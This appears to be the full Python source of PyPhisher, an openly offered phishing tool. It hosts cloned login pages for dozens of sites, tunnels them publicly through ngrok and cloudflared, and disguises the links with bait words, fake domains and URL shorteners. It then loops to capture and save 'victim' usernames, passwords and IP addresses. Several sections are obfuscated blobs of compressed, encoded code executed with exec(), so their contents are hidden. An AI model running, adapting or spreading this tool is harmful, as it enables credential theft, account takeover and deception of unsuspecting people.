# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.7
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'DA96106DF1DFDF5FBF07ED8014540A1302E2914715D4B0B8CB7B5BB53DB0107919495868018825E75101F6557FBB64AB8E9D9DF5FC590BE338F83F361E87E2B7EDF091AE46E45A63B34E156F5D954B1D48BA206315A793E0E94891A60485B9EA5F7851AD83F6FDFBF8C558D19AF099929BE13F1F2939DCA49F67A8381A8E354819E48B0AF3DC0F95A9CA2B89374B6B0E1D2A3401C57790B90005F86A36F4041D2EA1AEABDCA631EC9980BD8CC1790768480FC18EDE029193522FF22B5003464D8A5C745AEE4A33DEDA0D95D213998B23457110DE5B08E1609E1FC3C1CF4009D367340B50108C96BC57B1B8456D6FCC2115841814E7F7F5FDFDFAFAFDFCFD7EBF606C602E97F949786B9884D80A8174EF8173BB72B28004D1D8BC1551C987'))



# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.7"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''


pkgs=[ "php", "curl", "wget", "unzip" ]


try:
    test = popen("cd $HOME && pwd")
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

choice_file = "templates.json"

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    
# Check if mac has tunneler binaries
if brew:
    if system("command -v ngrok > /dev/null 2>&1")==0:
        ngrok=True
    else:
        ngrok=False
    if system("command -v cloudflared > /dev/null 2>&1")==0:
        cloudflared=True
    else:
        cloudflared=False
else:
    ngrok=False
    cloudflared=False

print(f"\n{info}Please wait!\n")


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'====A52526ZHQ77H74DTPRFNLY7IH4APZEMKF7AUNTYPBKE5IG2MCQXPBLWJMIG7GX4UZFCLXUYSH2U35HQCYN5XGYNEXL73BJNEIX4GDD72ZMXCBLKDWX7G25QO5EUST72DS2S3SV6IVFNXGMRT22NOERQF662HCBA6TA4JFXBHBS2KROKRMDX6R7C6EQ7EZ6ZHWIRBNSAVH4OMCFKVK5VAYLH3TVEZ27EM5KKMLUY66Q2IHKRETJEA3DTOXEPU7WB4HMO63TZSTTWR6FT3YXO2SVZ5TP2GZRLWLZ22LTZL7Q3QDYCO7QHXZNW2HHA27L5GURBGKTY34TPYKAP7I4FHU4LHLSKWHAYAZKQXYGLA7WG4NAU2GISQT2SR232IVM65D6ONEGGNABETHZL4KMH7X7PF3BYBCJPDOGNNJ2YBCISJTLWXZWTWG3RCA2H6GXFW2JK7NQ2NQM63AUDO5LUEI2AHRTWIITF2ZWIW4JCUYYMDFWIECX7TFTAGEB2WOOBX3EQ4CYXYLZAIPUI6K7V7PU3B4OMOFVS4K4SKNVRL7UUI5YN5DWSNERLXASIROXJE66EOUSK5DH65HBOXNL3Y6GV3J5FPCKYVJJVQGNDU4QLZOQ64VOVXJZRHBULK6L7MFLD7TZ23DCXXCH6ABR6G46ABQFBAM5GY3FW4CES2MFAJ6M4IKONPCZZGCUK53CD467FY2WJBZTOWJX45DYHGZ5VOZJ5JDMQUK25IOGEXXJBG4HFTVYHOK6QBWFPPJTXPAGU7K6M6BS44SJWK4H2XYIOIZU6SZKJ45L7KFAKRWAB5LZCT2LA5L7BGY64B6JCPR3F3IY2EYCATMHNI26432GNM6T6OUVPO2GTQYUTGPWCQ3MYLJZVYUANO5G2CMDHTKOVPXOOTIUM5MEBA75U2EDIDUPKBIMKZICDOD7ABOMYY5HP4IYLI6ZWI6MK4XBK47I5JN2CPWV4UYTXIJZAGOYMU6XXFO74PWANEXE5POYXDX6YW2KZICHDNQGQ56Q3YOMFZKJYORNJHKQRSMLBNEVBUOCLIXKPTX4H4UF2XV3U4MWRDHALKBLD34N5OU3QU3DE5XXFXPCQHKLRXKRBM3QK54EYG66HTDWUOZCZMYPPENIGTHU7TUV7BGGZ3SPLWHU3NWN42MQ2DUQJAYVINTTKTURZQUAQ5QDNZD5XNJVJ6DRGMKUEN33EL6WP36TIDD4FFWQUNCF7PPLDDVXKAA4Y4LUBW3X7UM2OCQDQVK6IDRGRGZ72OB4NHRP5JWYUALLSV5O7CEIN2RYUTEBGPVFF246M3XOAJSCYJ2BRZZMKMM7GT7SKV6M7VSZN24LMEZNU5OGRV7NVOGYFJ62OSPLB2FRCWXVJUU5BXH44KE6UYACVCZBOBJCM5CE66HKK2IJL22QQBNUW7CYTY4JFMLEZWDV6NATZI245YEQ7U54FMDUQEPH6IYY23OVQQQ73VYIBYP3RALHFA3X7SABRLYBUOTWDHDUX62H6K2CWFG3OYN6HADMUR6GAXX3L3AZTXR2QZI6VSCEJGDEQ5RHRQH5RO4LAXMX4XGABXXDNWQOLLY3JG3XEFVIRFZ5NONATYSYJ5CQIEUPEM7H6HV4J63AFMM4RWUN4KSSC77NJKM4QPQY46IFUUAU5VGEI7MTWV4SAYZBTSWFWGDE3EOHDTX25CRZNN6QWCRVARZBJ5REVE2HCZOU3GDC5AG7UXUJMU5VHENAV6IM2EQ6QSWTK4M7M7Z75HP46RP73P75DP4TL76777FFKVV7S6PBNIBJ375P4AT3WKSE65656JDOAR2AFSZR7RECFOCQYBZJF3BOCP'))


# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")



# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")



# Website chooser
def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()


# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# First function main
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'tWD4e8373PP+zensyvA8ypikDpM9Rkb7uMPxdpyjC6hmOCnMvYX9WwYcdl7NXoZaDKh+c3U5Qgnk2mwCK5nUPbwgLrYnPCecX1JmqrCkIMp0doSp6dhkYb133mZ67tCxtDHcsr2D2owxtvvGn3VMmOWaHPqdH6GY2paVUUS44jF9Ankc9IB/TKrAPyIsC//MgWubVpHn238VGVJfPb7FYmqkahVrTV7TKooXZQyLVx6LrC/Rr1RyHmFZWXJeD95Hm+HwrSfkW9k3BSdXUhX1QUvvO0U8AsEKIs24Z49KLAHaVNa/VDUS2O8VRg1s6RXwsTqcDohMmbdJhNcCYjY9O9MLZyoe58RImvWdlmJWwWbeE/WCgViM01U2frOZw2B2Bref9bVi6Tovl/z/KTVm/VuHvmaXp56bXLU8EPknfvAq0VykE5OijBoY6DnReKbIvUXY09EwEfCu2xqTMKzU21xoW5/nShImxVWbspxNEl+xtYgaXXmhj3yQiMzx7mjg8axTZ1CdTvMlTcBJBwcXhaHgaG4r7zcyN+6ZKnFBvzTN2cVYGfKn4Na6/j3pGrj6CP5JYF4KKO3xRrS+XC1miZbHUVVQFYVKyHEedTsQhS5USdB2ATfyRnTxQr4EO05gn4dvyfUKWYBywEbZVGbumW9J+0COQtGntSjng+ykOfwBHhdZM3ZxVeBdYGWXnbOZjjvRBnWajTTrE7Dw1MWcyCJkr+Qv7nYTR4CxGdAzF9i4BrdtWSWD3XZH68lUWlyGHkIbmQ8u0wWfOr25W+sXJdMHez+SoMhRItWuNObaSPpXlejUjz2TJzk4oor8SId56MF6LiYz7z4bVJnE6HOQ9P4hPsqOWe/DmeuZXiQqxBrk/wtkSJBs1fTVuTblPePudqUanCSGV6LfMdRtyUqgKBGwY7jgs//Py+3f/+8z3rIOyOh5vfNuTJcFEOQZ0PBhCQhVU8QYcvCgo/ETnDMAAg0oSeE0NwJe'))


# 2nd function installing packages and downloading tunnelers
def prerequiments():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing proot{nc}")
            system("pkg install proot -y")
        installer("pkg")
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(f"{error}Unzip cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    architecture=popen("uname -m").read()
    platform=popen("uname").read()
    if not exists(f"{root}/.ngrokfolder"):
        system("mkdir $HOME/.ngrokfolder")
    if not exists(f"{root}/.cffolder"):
        system("mkdir $HOME/.cffolder")
    if not isfile(f"{root}/.ngrokfolder/ngrok") or (brew and not ngrok):
        sprint(f"\n{info}Downloading ngrok.....{nc}")
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif architecture.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif architecture.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif architecture.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                system("brew install ngrok/ngrok/ngrok")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not isfile(f"{root}/.cffolder/cloudflared") or (brew and not cloudflared):
        sprint(f"\n{info}Downloading cloudflared.....{nc}")
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif architecture.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif architecture.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1")
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                system("brew install cloudflare/cloudflare/cloudflared")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf cloudflared.tgz")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(f"{error}Previous php still running! Please restart terminal and try again{nc}")
        pexit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(f"{error}Previous ngrok still running. Please restart terminal and try again{nc}")
        pexit()
    system("rm -rf $HOME/.site && cd $HOME && mkdir .site")


# 3rd function checking requirements and download files 
def requirements(folder, mask):
    if exists(f"{root}/.websites/"):
        system("rm -rf $HOME/websites/*")
        system("cp -r sites/* $HOME/.websites")
    system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server(mask)

# Start server and tunneling
def server(mask):
    system("clear")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    if not system(f"curl --output /dev/null --silent --head --fail {local_url}"):
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    elif brew and ngrok and cloudflared:
        system(f"cd $HOME/.ngrokfolder && ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    else:
        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    sleep(9)
    ngrok_link=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
    else:
        ngrok_check=False
    if isfile(f"{root}/.cffolder/log.txt"):
        cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    else:
        cf_link=""
        sprint(f"\n{error}Cloudflared failed to start!{nc}")
    if cf_link.find("cloudflare")!=-1:
        cf_check=True
    else:
        cf_check=False
    if ngrok_check and cf_check:
        url_manager(cf_link, mask, "1", "2")
        url_manager(ngrok_link, mask, "3", "4")
        cuask(cf_link)
    elif not ngrok_check and cf_check:
        url_manager(cf_link, mask,  "1", "2")
        cuask(cf_link)
    elif not cf_check and ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    elif not (cf_check and ngrok_check):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()


# Output urls
def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}/index.html")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}/index.html")


# Ask to mask url
def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url.strip()
    internet()
    resp= popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short= resp.replace("https://", "")
    domain= input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait= input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final= domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
